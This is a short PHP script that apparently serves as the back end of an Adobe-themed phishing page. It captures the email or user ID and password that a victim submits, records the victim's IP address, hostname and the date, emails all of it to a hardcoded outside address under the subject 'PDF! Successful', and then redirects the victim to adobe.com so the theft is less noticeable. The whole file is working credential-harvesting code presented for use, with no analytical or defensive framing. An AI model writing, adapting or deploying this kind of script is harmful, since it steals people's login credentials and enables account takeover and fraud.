<?php

$adddate = date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);

// Replace 'userID' and 'password' with the correct field names in your form
$message .= "User ID (Email): " . $_POST['userID'] . "\n"; // email or user ID
$message .= "Password: " . $_POST['password'] . "\n"; // password
$message .= "\n";
$message .= "Date: " . $adddate . "\n";
$message .= "Host: " . $host . "\n";
$message .= "IP: " . $ip . "\n";
$message .= "------------- DataMASTER -------------\n";

// Replace with your recipient's email
$recipient = "anthonytaylor.w1@outlook.com"; 
$subject = "PDF! Successful " . $_POST['userID'] . "\n"; // Using the email as part of the subject
$from = "$ip"; // Sender's email is the IP address
$headers .= $_POST['eMailAdd'] . "\n"; // Assuming 'eMailAdd' is an additional email field
$headers .= "MIME-Version: 1.0\n";
$headers = "From: $from\r\n";
$headers .= '' . "\r\n";

// Send email
if (mail($recipient, $subject, $message, $headers)) {
    header("Location: https://adobe.com/");
} else {
    header("Location: index.html");
}

?>
